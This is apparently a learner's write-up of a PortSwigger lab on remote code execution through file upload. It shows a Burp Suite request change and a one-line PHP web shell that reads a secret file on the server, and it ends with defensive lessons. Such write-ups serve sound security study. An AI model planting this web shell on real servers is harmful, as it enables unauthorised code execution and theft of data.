# Remote Code Execution via Web Shell Upload

I completed another PortSwigger Web Security Academy lab: **Remote code execution via web shell upload**.

This lab demonstrated how an unrestricted file upload can become much more serious when the server allows an uploaded server-side script to execute.

## Lab Process

I started by uploading an image file to my account.

The original filename was:

```text
cat.jpeg
```

I intercepted the upload request using **Burp Suite**.

### 1. Modify the uploaded file

I modified the filename from:

```text
cat.jpeg
```

to:

```text
exploit.php
```

I also modified the contents of the uploaded file to contain PHP code that reads the lab's secret file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### 2. Request the uploaded file

After the upload, the application normally requested the image using:

```http
GET /files/avatars/cat.jpeg
```

I modified the request to:

```http
GET /files/avatars/exploit.php
```

Because the server was configured to execute PHP files in that location, the PHP code was executed when the file was requested.

### 3. Retrieve the secret

The response returned the lab secret:

```text
BkVqPMDfa984STep1MFjsoFTlyP8biGy
```

I submitted the secret and successfully completed the lab. 🎯

## What I Learned

This lab helped me understand the relationship between **file upload vulnerabilities and remote code execution**.

The important part was not simply being able to upload a file. The vulnerability became much more serious because:

```text
Upload file
     ↓
Change it to a server-side script
     ↓
Server stores the script
     ↓
Server executes the script
     ↓
Code execution
```

### Key Takeaways

* File upload validation is important.
* File extensions should not be blindly trusted.
* Uploaded files should not be stored in locations where server-side code can execute.
* Burp Suite can be used to inspect and modify multipart upload requests.
* A vulnerable upload function can potentially lead to Remote Code Execution.

This was another practical PortSwigger lab that helped me understand how a seemingly simple image-upload feature can become a serious security vulnerability.

#CyberSecurity #PortSwigger #WebSecurity #Pentesting #BurpSuite #RCE
